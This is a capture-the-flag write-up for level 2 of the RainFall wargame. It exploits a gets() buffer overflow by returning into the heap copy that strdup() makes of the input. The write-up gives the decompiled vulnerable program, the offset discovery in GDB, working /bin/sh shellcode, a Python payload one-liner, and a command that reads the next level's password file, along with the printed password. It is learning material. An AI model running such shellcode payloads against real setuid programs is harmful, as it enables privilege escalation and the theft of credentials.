# LEVEL 2

To start, I will take a look on our program by using GDB, Ghibra and ltrace.

Let's see the decompilated program *(by using Ghibra)*.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>

char	buffer[76];

void
p (void) {
	void	*ret_addr;

	fflush(stdout);
	gets(buffer);

	ret_addr = __builtin_ret_addr(0);
	if (((unsigned int)ret_addr & 0xb0000000) == 0xb0000000) {
		printf("(%p)\n", ret_addr);
		exit(1);
	}
	puts(buffer);
	strdup(buffer);
	return ;
}

int
main (void) {
	p();
	return (0);
}
```

Before start we can see that no function calls the ```system()``` or an ```execve()``` so we have to do a **ShellCode injection**. A shell code injection is technique that consists in changing a function return address or a function call by the address of our buffer which contains a executable code. Here our executable code is **ShellCode** that is an ASM code translated in bytecode who launch a shell terminal. We just need to know where inject it.

Our program use ```gets()``` so we can try to use a **Buffer Overload Attack**, but the ```if``` condition checks if the p return address is on the heap and not on the stack. So our return address must be on the heap.

We used GDB and Ghibra but not ltrace, let's use it.

```shell
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7a4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                              = 0
gets(0xbffff6ac, 0, 0, 0xb7e5ec73, 0x80482b5AAAAAAAA
)                   = 0xbffff6ac
puts("AAAAAAAA"AAAAAAAA
)                                                = 9
strdup("AAAAAAAA")                                              = 0x0804a008
+++ exited (status 8) +++
```

After many launched of ltrace, ```strdup()``` return address never changed, so we can understand that our function doesn't have ASLR *(Address Space Layout Randomization)* and the return address is on the head.

So we will use the ```strdup()``` address to copy our shellcode, then we will change the return value of ```strdup()```, Like this the return address will point to our shellcode instead of ```main()```.

### How to create a Payload ?

#### Find a ShellCode.

We can easily find a shellcode on internet with [this site](https://shell-storm.org/shellcode/)

#### My shellcode :

`\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`

#### Find EIP :

We can easily find the EIP by using this [EIP Tools](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/)

```shell
level2@RainFall:~$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag" > /tmp/fill_buff
level2@RainFall:~$ gdb -q level2
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) r < /tmp/fill_buff
Starting program: /home/user/level2/level2 < /tmp/fill_buff
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

#### Create the exploit

The exploit recipe is : `X * "\x90" + ShellCode(size = 21) + Y "\90" + "strdup() return address"` - `TOTAL SIZE = EIP SIZE = 80`

### Payload

`python -c 'print "\x90"*20 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x90"*39 + "\x08\xa0\x04\x08"' > /tmp/payload`

Now we can try to load the payload inside our program.

```shell
level2@RainFall:~$ (cat /tmp/payload; echo "cat /home/user/level3/.pass") | ./level2
��������������������j
                     X�Rh//shh/bin��1�̀����������������������������������
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```




